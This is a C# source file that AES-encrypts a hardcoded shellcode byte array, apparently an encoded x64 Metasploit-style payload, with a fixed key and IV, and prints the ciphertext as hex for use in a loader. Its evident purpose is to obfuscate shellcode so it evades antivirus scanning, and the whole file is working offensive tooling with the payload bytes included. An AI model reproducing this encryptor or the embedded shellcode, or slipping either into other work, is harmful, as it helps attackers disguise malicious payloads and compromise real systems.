using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
/// <summary>
/// Programmer : Diljith Suresh
/// </summary>
namespace Encrypt
{
    class ProgramT
    {
        static void MainT(string[] args)
        {
          
            byte[] Key = Convert.FromBase64String("fRZstgVonk1WpSLeb9ZKcoDkGPzHWDqSAMyTxoopGc8=");
             byte[] IV = Convert.FromBase64String("pyve1rU+58PN/2MWEftieA==");

           // byte[] Key = ASCIIEncoding.ASCII.GetBytes("thisisa32bytekey0123456789!@#$%^");
            //byte[] IV = ASCIIEncoding.ASCII.GetBytes("thisis16bytes456");

            byte[] shell = new byte[] {0x48,0x31,0xc9,0x48,0x81,0xe9,0xae,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xee,0xa1,0x04,0x8f,0xdc,0xf6,0x87,0x89,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x12,0xe9,0x87,0x6b,0x2c,0x1e,
0x4b,0x89,0xee,0xa1,0x45,0xde,0x9d,0xa6,0xd5,0xc1,0xdf,0x73,0x55,0xea,0x94,
0x7d,0xd5,0xe9,0xa6,0x2a,0x56,0x97,0x94,0x7d,0xd5,0xa9,0xb8,0xe9,0x0b,0x38,
0x96,0xbc,0xcf,0x02,0x9c,0xf1,0x49,0xbe,0x15,0xbe,0xb6,0x49,0x42,0x9d,0x65,
0xf3,0xde,0xda,0xa7,0xc8,0x2f,0x68,0x09,0xce,0xdd,0x37,0x65,0x64,0xbc,0xe9,
0x8f,0xdd,0xfc,0xb7,0xd6,0x02,0xac,0x9d,0x4c,0x8e,0x0c,0x90,0x06,0xf1,0xf6,
0xaa,0x06,0x80,0x59,0x84,0x87,0x89,0xee,0x2a,0x84,0x07,0xdc,0xf6,0x87,0xc1,
0x6b,0x61,0x70,0xe8,0x94,0xf7,0x57,0x02,0xa6,0xb9,0x40,0x04,0x9c,0xd6,0xd7,
0xc0,0xef,0x71,0xe7,0xd9,0x91,0xc7,0x4e,0xc1,0x11,0x68,0x45,0x04,0xe8,0x7e,
0xcf,0x88,0x38,0xe9,0x35,0x4f,0x9d,0x37,0x4e,0x84,0x42,0xe0,0x05,0x4e,0xe4,
0x16,0xf2,0x78,0xa2,0xa2,0x48,0xab,0xd4,0xb3,0xbe,0x58,0x9b,0x79,0x5c,0xcb,
0x57,0xb6,0xa3,0xc0,0xef,0x71,0x62,0xce,0x57,0xfa,0xcf,0xcd,0x65,0xe1,0x18,
0xc6,0xdd,0x26,0xc6,0x02,0xea,0x29,0x4c,0x8e,0x0c,0xb7,0xdf,0xc8,0xb6,0xff,
0x5d,0xd5,0x9d,0xae,0xc6,0xd0,0xaf,0xfb,0x4c,0x0c,0x30,0xd6,0xc6,0xdb,0x11,
0x41,0x5c,0xce,0x85,0xac,0xcf,0x02,0xfc,0x48,0x4f,0x70,0x23,0x09,0xda,0xc1,
0xdf,0x7a,0x57,0xc6,0x62,0x81,0xee,0xe7,0x87,0xcf,0x61,0xfb,0xdc,0xb7,0xd1,
0xc1,0x67,0x40,0x4d,0x48,0x1e,0xba,0xf0,0xaf,0xe9,0x5e,0xd1,0xdc,0x8f,0xbe,
0x0e,0x68,0xbd,0xfb,0x49,0xbe,0x1c,0xbb,0xb6,0x40,0xbd,0xf2,0x4d,0x35,0xe6,
0xa0,0xfe,0x2e,0xee,0xa1,0x04,0x8f,0x23,0x23,0x6f,0x84,0xee,0xa1,0x04,0xbe,
0xe5,0xc4,0xa9,0xb8,0xd8,0x99,0x2a,0xbe,0xf2,0xc1,0xb5,0x89,0xb4,0xe9,0x8d,
0x4e,0x95,0x31,0x47,0x32,0xef,0xa1,0x04,0xc2,0xed,0x3f,0xd4,0xda,0x84,0xa2,
0x57,0xc6,0x66,0xa1,0x0e,0x16,0x28,0xa1,0x04,0x8f,0xdc,0x09,0x52,0x61,0x69,
0xa1,0x04,0x8f,0xf3,0xba,0xc9,0xc0,0xb8,0x99,0x51,0xc8,0x95,0x94,0xe8,0xe5,
0x96,0xcc,0x5c,0xcc,0xbe,0xb3,0xcb,0xed,0x9c,0xc7,0x55,0xe0,0xae,0x83,0xf7,
0xf3,0xa5,0xf5,0x40,0xc3,0x93,0xbb,0xe5,0xc1,0x96,0xcd,0x6d,0xe2,0x8a,0x91,
0xe2,0xc2,0xbb,0xf1,0x6c,0xee,0xb4,0x8c,0xee,0xfd,0x88,0xd5,0x77,0xa2,0xbb,
0x99,0xcc,0xb1,0x99,0xf7,0x56,0xce,0xee,0x84,0xf5,0xbb,0xa9,0xd2,0x77,0xd8,
0xaf,0xa5,0xca,0xee,0xc3,0xf6,0x6f,0xfe,0xb8,0xc5,0xef,0xdf,0xb6,0xf2,0x49,
0xe4,0x8c,0x85,0xf0,0xce,0x8c,0xfb,0x55,0xcb,0xaa,0xa7,0xb7,0xc4,0xa7,0xd0,
0x76,0xcb,0xa5,0xc5,0xfe,0xce,0x82,0xfe,0x6a,0xdd,0xbd,0xdb,0xcf,0xd8,0x9f,
0xe7,0x7d,0xc3,0xb5,0x80,0xf4,0xe5,0x99,0xed,0x49,0xbf,0xaa,0x8e,0xc4,0xc2,
0xaa,0xf0,0x04,0xc7,0x55,0x37,0xd4,0xd3,0xaf,0xf9,0x49,0xbe,0x15,0xa5,0xcf,
0x31,0xee,0xa3,0x2c,0x0b,0xdc,0xf6,0x87,0x89,0xbe,0xf2,0x57,0xc6,0x1b,0x34,
0x6c,0xdc,0xc0,0x9a,0xfb,0x5a,0x94,0x7f,0x41,0xe3,0xe4,0xfe,0x57,0xd5,0x94,
0x7f,0x76,0xc4,0xdf,0x68,0x49,0xbe,0x15,0xa5,0xd4,0xc0,0x29,0x63,0x29,0x89,
0xc4,0x8d,0x78,0x5c,0x6b,0x61,0x71,0x90,0x94,0x31,0x46,0x01,0xfd,0xa1,0x04,
0xc6,0x66,0xb2,0x77,0xbc,0x0e,0xa1,0x04,0x8f,0xdc,0x09,0x52,0xc1,0x11,0x6e,
0x70,0x8d,0x37,0x3a,0x6f,0xdc,0xee,0xa1,0x04,0xdc,0x85,0x9c,0xc7,0xd3,0xa7,
0x28,0xd5,0x4e,0x3e,0xe6,0xce,0x4e,0x2e,0xa1,0x14,0x8f,0xdc,0xbf,0x3d,0xd1,
0x4a,0xf2,0xe1,0x8f,0xdc,0xf6,0x87,0x76,0x3b,0xe9,0x97,0xdc,0x8f,0xbe,0x0e,
0x6e,0xa6,0x28,0xf5,0xc7,0x55,0x2c,0xce,0x4e,0x2e,0xa1,0x24,0x8f,0xdc,0xbf,
0x0e,0x70,0xa7,0x1b,0x16,0x19,0x55,0x14,0x87,0x89,0xee,0xa1,0xfb,0x5a,0x94,
0x75,0x43,0xa9,0x6b,0x61,0x70,0x3d,0xba,0x7d,0x80,0xc1,0xef,0x62,0x81,0x4f,
0xa9,0x24,0xdf,0x4a,0xb6,0xcb,0x04,0xd6,0x95,0x31,0x45,0x79,0x5b,0x03,0x52,
0x70,0x09,0xf6,0x87,0x89};


            byte[] encshell = AESEncryptShellCode(shell, Key, IV);

            StringBuilder hexCodes = new StringBuilder(encshell.Length * 2);
            foreach (byte b in encshell)
            {
                hexCodes.AppendFormat("0x{0:x2},", b);
            }

            string finalencoded = hexCodes.ToString();

            finalencoded = finalencoded.Substring(0, finalencoded.Length - 1);

            Console.WriteLine(finalencoded);
            Console.Read();
        }

        private static byte[] GetIV(int num)
        {
            var randomBytes = new byte[num]; // 32 Bytes will give us 256 bits.

            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                // Fill the array with cryptographically secure random bytes.
                rngCsp.GetBytes(randomBytes);
            }

            return randomBytes;
        }

        private static byte[] GetKey(int size)
        {
            char[] caRandomChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()".ToCharArray();
            byte[] baKey = new byte[size];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetBytes(baKey);
            }
            return baKey;
        }

        private static byte[] AESEncryptShellCode(byte[] baShellcode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return GetAESEncryptedShellCode(baShellcode, encryptor);
                }
            }
        }

        private static byte[] GetAESEncryptedShellCode(byte[] baShellcode, ICryptoTransform cryptoTransform)
        {
            using (var msEncShellCode = new MemoryStream())
            using (var cryptoStream = new CryptoStream(msEncShellCode, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(baShellcode, 0, baShellcode.Length);
                cryptoStream.FlushFinalBlock();

                return msEncShellCode.ToArray();
            }
        }
    }
}
